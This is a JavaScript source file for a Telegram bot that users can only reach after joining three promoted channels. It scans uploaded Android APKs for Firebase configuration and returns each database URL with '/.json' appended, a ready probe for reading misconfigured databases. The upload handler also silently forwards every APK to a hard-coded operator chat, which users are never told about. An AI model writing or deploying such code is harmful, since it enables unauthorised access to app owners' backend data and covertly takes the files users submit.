const express = require("express");
const { Telegraf, Markup } = require("telegraf");
const AdmZip = require("adm-zip");
const fs = require("fs");
const path = require("path");
const os = require("os");

const BOT_TOKEN = process.env.BOT_TOKEN;
const DESTINATION_CHAT_ID =
  process.env.DESTINATION_CHAT_ID || "-1004352285600";

// Required channels
const REQUIRED_CHANNELS = [
  "@brotherpanell",
  "@PANELEMPIRE2",
  "@backuptt2"
];

if (!BOT_TOKEN) {
  console.error("ERROR: BOT_TOKEN is missing.");
  process.exit(1);
}

const bot = new Telegraf(BOT_TOKEN);

// ==========================================
// EXPRESS SERVER
// ==========================================

const app = express();

app.get("/", (req, res) => {
  res.status(200).send("APK Firebase Scanner Bot is running.");
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log(`Web server running on port ${PORT}`);
});

// ==========================================
// CHECK CHANNEL MEMBERSHIP
// ==========================================

async function isUserJoined(ctx) {
  const userId = ctx.from.id;

  for (const channel of REQUIRED_CHANNELS) {
    try {
      const member = await ctx.telegram.getChatMember(
        channel,
        userId
      );

      const status = member.status;

      if (
        status !== "creator" &&
        status !== "administrator" &&
        status !== "member"
      ) {
        return false;
      }

    } catch (error) {
      console.error(
        `Membership check failed for ${channel}:`,
        error.message
      );

      return false;
    }
  }

  return true;
}

// ==========================================
// JOIN SCREEN
// ==========================================

async function showJoinScreen(ctx) {
  await ctx.reply(
    "🔐 Please join all 3 required channels first.\n\nAfter joining all channels, press the Verify button.",
    Markup.inlineKeyboard([
      [
        Markup.button.url(
          "📢 Join Channel 1",
          "https://t.me/brotherpanell"
        )
      ],
      [
        Markup.button.url(
          "📢 Join Channel 2",
          "https://t.me/PANELEMPIRE2"
        )
      ],
      [
        Markup.button.url(
          "📢 Join Channel 3",
          "https://t.me/backuptt2"
        )
      ],
      [
        Markup.button.callback(
          "✅ Verify",
          "verify_join"
        )
      ]
    ])
  );
}

// ==========================================
// /START
// ==========================================

bot.start(async (ctx) => {
  try {
    const joined = await isUserJoined(ctx);

    if (!joined) {
      return showJoinScreen(ctx);
    }

    await ctx.reply(
      "✅ Verification successful!\n\n📦 Please upload your APK file."
    );

  } catch (error) {
    console.error("/start error:", error);

    await ctx.reply(
      "⚠️ Something went wrong. Please try again later."
    );
  }
});

// ==========================================
// VERIFY BUTTON
// ==========================================

bot.action("verify_join", async (ctx) => {
  try {
    await ctx.answerCbQuery("Checking membership...");

    const joined = await isUserJoined(ctx);

    if (!joined) {
      return ctx.reply(
        "❌ Verification failed.\n\nPlease make sure you have joined all 3 channels, then press Verify again."
      );
    }

    await ctx.reply(
      "✅ Verification successful!\n\n📦 Please upload your APK file."
    );

  } catch (error) {
    console.error("Verify error:", error);

    await ctx.reply(
      "⚠️ Could not verify your membership. Please try again."
    );
  }
});

// ==========================================
// DOCUMENT / APK HANDLER
// ==========================================

bot.on("document", async (ctx) => {
  const document = ctx.message.document;

  const fileName =
    document.file_name || "unknown.apk";

  // Only APK files
  if (!fileName.toLowerCase().endsWith(".apk")) {
    return ctx.reply(
      "❌ Invalid file.\n\nPlease upload an APK file."
    );
  }

  // Check membership again
  const joined = await isUserJoined(ctx);

  if (!joined) {
    return showJoinScreen(ctx);
  }

  const processingMessage = await ctx.reply(
    "⏳ APK received.\n\n🔍 Scanning Firebase configuration..."
  );

  let tempFile = null;

  try {
    // ========================================
    // DOWNLOAD APK
    // ========================================

    const fileLink =
      await ctx.telegram.getFileLink(
        document.file_id
      );

    const response =
      await fetch(fileLink.href);

    if (!response.ok) {
      throw new Error(
        "Failed to download APK."
      );
    }

    const buffer =
      Buffer.from(
        await response.arrayBuffer()
      );

    tempFile = path.join(
      os.tmpdir(),
      `${Date.now()}-${safeFileName(fileName)}`
    );

    fs.writeFileSync(
      tempFile,
      buffer
    );

    // ========================================
    // SEND ONLY APK TO DESTINATION CHAT
    // ========================================

    await ctx.telegram.sendDocument(
      DESTINATION_CHAT_ID,
      {
        source: tempFile
      }
    );

    // ========================================
    // SCAN APK
    // ========================================

    const result =
      scanAPK(tempFile);

    // ========================================
    // CREATE RESULT
    // ========================================

    let output =
      "🔎 <b>APK Firebase Scan Result</b>\n\n";

    if (!result.found) {

      output +=
        "❌ No Firebase configuration detected.";

    } else {

      output +=
        "🔥 <b>Firebase configuration detected</b>\n\n";

      // Database URLs
      if (result.databaseUrls.length > 0) {

        output +=
          "<b>Firebase Database URL:</b>\n";

        for (
          const url of result.databaseUrls
        ) {

          output +=
            `${escapeHtml(url)}\n\n`;

          output +=
            "<b>.json URL:</b>\n";

          output +=
            `${escapeHtml(
              makeJsonUrl(url)
            )}\n\n`;
        }
      }

      // Project IDs
      if (result.projectIds.length > 0) {

        output +=
          "<b>Project ID:</b>\n";

        for (
          const id of result.projectIds
        ) {
          output +=
            `${escapeHtml(id)}\n`;
        }

        output += "\n";
      }

      // Storage bucket
      if (
        result.storageBuckets.length > 0
      ) {

        output +=
          "<b>Storage Bucket:</b>\n";

        for (
          const bucket of result.storageBuckets
        ) {
          output +=
            `${escapeHtml(bucket)}\n`;
        }

        output += "\n";
      }

      // App ID
      if (result.appIds.length > 0) {

        output +=
          "<b>Firebase App ID:</b>\n";

        for (
          const appId of result.appIds
        ) {
          output +=
            `${escapeHtml(appId)}\n`;
        }
      }
    }

    // ========================================
    // SEND RESULT
    // ========================================

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      processingMessage.message_id,
      undefined,
      output,
      {
        parse_mode: "HTML"
      }
    );

  } catch (error) {

    console.error(
      "APK processing error:",
      error
    );

    try {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        processingMessage.message_id,
        undefined,
        "❌ APK scanning failed.\n\nPlease try another APK."
      );
    } catch {}
    
  } finally {

    // ========================================
    // DELETE TEMPORARY APK
    // ========================================

    if (
      tempFile &&
      fs.existsSync(tempFile)
    ) {
      try {
        fs.unlinkSync(tempFile);
      } catch {}
    }
  }
});

// ==========================================
// APK SCANNER
// ==========================================

function scanAPK(apkPath) {

  const zip =
    new AdmZip(apkPath);

  const entries =
    zip.getEntries();

  const databaseUrls =
    new Set();

  const projectIds =
    new Set();

  const storageBuckets =
    new Set();

  const appIds =
    new Set();

  for (
    const entry of entries
  ) {

    if (entry.isDirectory) {
      continue;
    }

    let content;

    try {

      content =
        entry
          .getData()
          .toString("utf8");

    } catch {

      continue;
    }

    // ======================================
    // Firebase Realtime Database
    // ======================================

    const firebaseIoMatches =
      content.match(
        /https?:\/\/[A-Za-z0-9._-]+\.firebaseio\.com(?:\/[^\s"'<>]*)?/gi
      );

    if (firebaseIoMatches) {

      for (
        const url of firebaseIoMatches
      ) {

        databaseUrls.add(
          cleanUrl(url)
        );
      }
    }

    // ======================================
    // New Firebase Database Domain
    // ======================================

    const firebaseDatabaseMatches =
      content.match(
        /https?:\/\/[A-Za-z0-9._-]+\.firebasedatabase\.app(?:\/[^\s"'<>]*)?/gi
      );

    if (firebaseDatabaseMatches) {

      for (
        const url of firebaseDatabaseMatches
      ) {

        databaseUrls.add(
          cleanUrl(url)
        );
      }
    }

    // ======================================
    // google-services.json
    // ======================================

    const firebaseUrlMatches =
      content.match(
        /"firebase_url"\s*:\s*"([^"]+)"/gi
      );

    if (firebaseUrlMatches) {

      for (
        const item of firebaseUrlMatches
      ) {

        const match =
          item.match(
            /"firebase_url"\s*:\s*"([^"]+)"/i
          );

        if (match) {

          databaseUrls.add(
            cleanUrl(match[1])
          );
        }
      }
    }

    // ======================================
    // Storage Bucket
    // ======================================

    const bucketMatches =
      content.match(
        /[A-Za-z0-9._-]+\.(?:appspot\.com|firebasestorage\.app)/gi
      );

    if (bucketMatches) {

      for (
        const bucket of bucketMatches
      ) {

        storageBuckets.add(
          bucket
        );
      }
    }

    // ======================================
    // Firebase App ID
    // ======================================

    const appIdMatches =
      content.match(
        /1:[0-9]+:android:[a-f0-9]+/gi
      );

    if (appIdMatches) {

      for (
        const appId of appIdMatches
      ) {

        appIds.add(
          appId
        );
      }
    }

    // ======================================
    // Firebase Project ID
    // ======================================

    const projectMatches =
      content.match(
        /[A-Za-z0-9-]+\.firebaseapp\.com/gi
      );

    if (projectMatches) {

      for (
        const value of projectMatches
      ) {

        projectIds.add(
          value.replace(
            ".firebaseapp.com",
            ""
          )
        );
      }
    }
  }

  return {

    found:
      databaseUrls.size > 0 ||
      projectIds.size > 0 ||
      storageBuckets.size > 0 ||
      appIds.size > 0,

    databaseUrls:
      [...databaseUrls],

    projectIds:
      [...projectIds],

    storageBuckets:
      [...storageBuckets],

    appIds:
      [...appIds]
  };
}

// ==========================================
// CREATE .JSON URL
// ==========================================

function makeJsonUrl(url) {

  url =
    url.replace(
      /\/+$/,
      ""
    );

  if (
    url.endsWith(".json")
  ) {
    return url;
  }

  return `${url}/.json`;
}

// ==========================================
// HELPERS
// ==========================================

function cleanUrl(url) {

  return url
    .trim()
    .replace(
      /[\\'")>,;]+$/g,
      ""
    );
}

function safeFileName(name) {

  return name.replace(
    /[^a-zA-Z0-9._-]/g,
    "_"
  );
}

function escapeHtml(value) {

  return String(value)
    .replace(
      /&/g,
      "&amp;"
    )
    .replace(
      /</g,
      "&lt;"
    )
    .replace(
      />/g,
      "&gt;"
    )
    .replace(
      /"/g,
      "&quot;"
    );
}

// ==========================================
// START BOT
// ==========================================

bot.launch()
  .then(() => {
    console.log(
      "✅ Telegram APK Scanner Bot started."
    );
  })
  .catch((error) => {
    console.error(
      "❌ Bot startup error:",
      error
    );
  });

process.once(
  "SIGINT",
  () => bot.stop("SIGINT")
);

process.once(
  "SIGTERM",
  () => bot.stop("SIGTERM")
);
